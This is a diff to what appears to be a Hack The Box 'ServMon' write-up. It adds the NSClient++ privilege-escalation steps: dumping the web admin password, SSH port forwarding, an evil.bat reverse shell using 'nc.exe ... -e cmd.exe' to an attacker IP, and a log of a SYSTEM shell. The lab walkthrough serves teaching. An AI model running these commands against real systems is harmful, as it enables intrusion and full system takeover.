@@ -216,7 +216,7 @@ Further Google search found that `NVMS-1000` is vulnerable to a directory traver
 
 Leveraging this vulnerability, we can view the `/Users/Nathan/Desktop/Passwords.txt` file.
 
-![image](/assets/img/post/htb/servmon/05png)
+![image](/assets/img/post/htb/servmon/05.png)
 
 
 ## SMB Password Guessing
@@ -286,6 +286,9 @@ Using that credentials, we can ssh into the box and read the `user.txt` flag.
 <b>user.txt</b>
 
 ```console
+root@kali:~/Documents/htb/box/servmon# ssh nadine@10.10.10.184
+nadine@10.10.10.184's password:
+
 Microsoft Windows [Version 10.0.18363.752]          
 (c) 2019 Microsoft Corporation. All rights reserved.
                                                     
@@ -314,7 +317,81 @@ nadine@SERVMON C:\Users\Nadine\Desktop>type user.txt
 
 There is a public privilege escalation for NSClient++. It can be found [here](https://www.exploit-db.com/exploits/46802). In a nutshell, a low privileged user can read the web admin password for NSClient++ from its configuration file. Within the web, due to a lack of restrictions, a user can create a scheduled script to run and NSClient++ is usually running as a Local SYSTEM. Abusing this, one can escalate its privilege to SYSTEM. 
 
+1. Grab web administrator password
 
+```console
+nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display
+Current password: ew2x6SsGTxjRwXOT
+```
+
+2. Login and enable following modules including enable at startup and save configuration
+- CheckExternalScripts
+- Scheduler
+
+When we attempt to login, we get 403 Forbidden error. 
+
+![image](/assets/img/post/htb/servmon/06.png)
+
+If we read the `nsclient.ini` file, we can see that the allowed host is `127.0.0.1`. 
+
+```cmd
+nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini
+´╗┐# If you want to fill this file with all available options run the following command:
+#   nscp settings --generate --add-defaults --load-all
+# If you want to activate a module and bring in all its options use:
+#   nscp settings --activate-module <MODULE NAME> --add-defaults
+# For details run: nscp settings --help
+
+
+; in flight - TODO
+[/settings/default]
+
+; Undocumented key
+password = ew2x6SsGTxjRwXOT
+
+; Undocumented key
+allowed hosts = 127.0.0.1
+```
+
+Let's type `~C` to change our console to `SSH>` mode and start port forwarding.
+
+```console
+nadine@SERVMON C:\Program Files\NSClient++>
+ssh> -L 8443:127.0.0.1:8443
+Forwarding port.
+```
+
+
+3. Download nc.exe and evil.bat to c:\temp from attacking machine
+	@echo off
+	c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe
+
+4. Setup listener on attacking machine
+	nc -nlvvp 443
+
+5. Add script foobar to call evil.bat and save settings
+- Settings > External Scripts > Scripts
+- Add New
+	- foobar
+		command = c:\temp\evil.bat
+
+6. Add schedulede to call script every 1 minute and save settings
+- Settings > Scheduler > Schedules
+- Add new
+	- foobar
+		interval = 1m
+		command = foobar
+
+7. Restart the computer and wait for the reverse shell on attacking machine
+	nc -nlvvp 443
+	listening on [any] 443 ...
+	connect to [192.168.0.163] from (UNKNOWN) [192.168.0.117] 49671
+	Microsoft Windows [Version 10.0.17134.753]
+	(c) 2018 Microsoft Corporation. All rights reserved.
+
+	C:\Program Files\NSClient++>whoami
+	whoami
+	nt authority\system
 
 
 
